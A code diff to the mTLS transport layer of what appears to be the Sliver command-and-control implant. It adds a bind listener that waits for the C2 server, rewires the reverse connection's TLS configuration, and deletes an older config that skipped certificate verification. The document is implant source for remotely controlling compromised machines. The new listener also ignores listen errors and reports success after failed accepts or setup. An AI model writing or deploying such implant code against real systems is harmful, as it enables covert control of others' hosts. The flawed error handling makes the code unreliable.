@@ -23,12 +23,11 @@ package transports
 import (
 	"bytes"
 	"crypto/tls"
-	"crypto/x509"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"io"
 	"net/url"
-	"os"
 	"strconv"
 	"sync"
 
@@ -53,6 +52,11 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
 	if err != nil {
 		return nil, err
+	}
+	if conn == nil {
+		// {{if .Config.Debug}}
+		log.Printf("NO TLS CONNECTION")
+		// {{end}}
 	}
 
 	send := make(chan *pb.Envelope)
@@ -164,9 +168,111 @@ func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
+func listenMTLS(uri *url.URL) (c *Connection, err error) {
+
+	// {{if .Config.Debug}}
+	log.Printf("Connecting -> %s", uri.Host)
+	// {{end}}
+	lport, err := strconv.Atoi(uri.Port())
+	if err != nil {
+		lport = 8888
+	}
+
+	// Get the TLS config for a bind connection.
+	tlsConfig := newCredentialsTLS().ServerConfig(uri.Hostname())
+
+	// Start listening for incoming TLS connections
+	ln, err := tls.Listen("tcp", fmt.Sprintf("%s:%d", uri.Hostname(), lport), tlsConfig)
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Accept failed: %s", err.Error())
+			// {{end}}
+		}
+
+		// Kill the listener: we don't have more than one C2 master at once.
+		err = ln.Close()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Listener close error: %s", err.Error())
+			// {{end}}
+		}
+
+		// Setup the MTLS connection and return it.
+		c, err := handleSliverConnection(conn.(*tls.Conn))
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("MTLS connection setup error: %s", err.Error())
+			// {{end}}
+		}
+
+		return c, nil
+	}
+
+	return nil, errors.New("Did not accept any MTLS connection from C2")
+}
+
+func handleSliverConnection(conn *tls.Conn) (*Connection, error) {
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[mtls] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			conn.Close()
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			socketWriteEnvelope(conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := socketReadEnvelope(conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+			}
+		}
+	}()
+
+	return connection, nil
+}
+
 // tlsConnect - Get a TLS connection or die trying
 func tlsConnect(address string, port uint16) (*tls.Conn, error) {
-	tlsConfig := getTLSConfig()
+
+	// Get the TLS config for a reverse connection.
+	tlsConfig := newCredentialsTLS().ClientConfig("")
+	// tlsConfig := getTLSConfig()
+
+	if tlsConfig == nil {
+		// {{if .Config.Debug}}
+		log.Printf("NO TLS CONFIG")
+		// {{end}}
+	}
+
 	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -175,32 +281,6 @@ func tlsConnect(address string, port uint16) (*tls.Conn, error) {
 		return nil, err
 	}
 	return connection, nil
-}
-
-func getTLSConfig() *tls.Config {
-
-	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Cannot load sliver certificate: %v", err)
-		// {{end}}
-		os.Exit(5)
-	}
-
-	// Load CA cert
-	caCertPool := x509.NewCertPool()
-	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))
-
-	// Setup config with custom certificate validation routine
-	tlsConfig := &tls.Config{
-		Certificates:          []tls.Certificate{certPEM},
-		RootCAs:               caCertPool,
-		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
-		VerifyPeerCertificate: rootOnlyVerifyCertificate,
-	}
-	tlsConfig.BuildNameToCertificate()
-
-	return tlsConfig
 }
 
 // {{end}} -MTLSc2Enabled
